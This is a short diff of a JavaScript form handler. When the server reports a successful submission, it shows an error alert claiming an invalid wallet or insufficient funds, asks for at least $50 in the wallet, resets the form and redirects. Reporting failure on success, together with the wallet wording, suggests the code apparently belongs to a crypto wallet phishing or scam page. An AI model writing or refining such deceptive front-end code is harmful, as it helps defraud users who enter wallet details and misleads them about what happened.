@@ -94,7 +94,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         );
 
         if (response.ok) {
-          alert("⛔ please try again");
+          alert("⛔ invalid wallet or insufficient fund's, please make sure you have at least or more than $50 in your wallet");
           form.reset();
 
           // ✅ REDIRECT WITH ID
